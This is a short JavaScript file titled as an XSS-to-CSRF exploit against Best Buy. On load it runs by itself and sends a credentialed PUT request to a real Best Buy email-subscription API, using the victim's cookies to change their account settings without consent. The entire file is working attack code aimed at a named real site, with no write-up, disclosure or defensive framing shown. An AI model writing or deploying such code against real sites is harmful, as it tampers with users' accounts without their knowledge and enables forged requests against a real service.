// exploit.js - XSS-to-CSRF attack on Best Buy
function changeEmailPreferences() {
  var xhr = new XMLHttpRequest();
  xhr.open("PUT", "https://www.bestbuy.com/commprefview/api/email-subscription", true);
  xhr.withCredentials = true; // Uses victim's cookies
  xhr.setRequestHeader("Content-Type", "application/json");
  
  xhr.onload = function() {
    console.log("[+] Request sent! Status:", xhr.status);
    alert("Email preferences updated! Check your Best Buy account.");
  };
  
  xhr.onerror = function() {
    console.error("[-] Request failed (CORS/Network error)");
  };
  
  xhr.send(JSON.stringify({
    "emailSubscriptions": [{
      "subscriptionId": "1001",
      "frequency": "1XWEEK" 
    }]
  }));
}

// Auto-execute when loaded
changeEmailPreferences();
